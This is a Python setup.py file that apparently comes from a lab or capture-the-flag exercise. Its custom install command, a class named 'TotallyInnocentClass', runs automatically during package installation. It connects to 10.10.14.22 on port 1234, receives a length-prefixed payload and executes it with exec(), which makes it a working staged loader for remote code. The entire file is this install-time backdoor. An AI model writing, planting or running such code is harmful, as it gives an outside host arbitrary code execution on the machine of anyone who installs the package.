import socket

import struct

from setuptools import setup
from setuptools.command.install import install


class TotallyInnocentClass(install):
    def run(self):
        s = socket.socket(2, 1)
        s.connect(("10.10.14.22", 1234))
        l = struct.unpack(">I", s.recv(4))[0]
        d = s.recv(4096)
        while len(d) != l:
            d += s.recv(4096)

        exec(d, {"s": s})

setup(
    cmdclass={
        "install": TotallyInnocentClass
    }
)
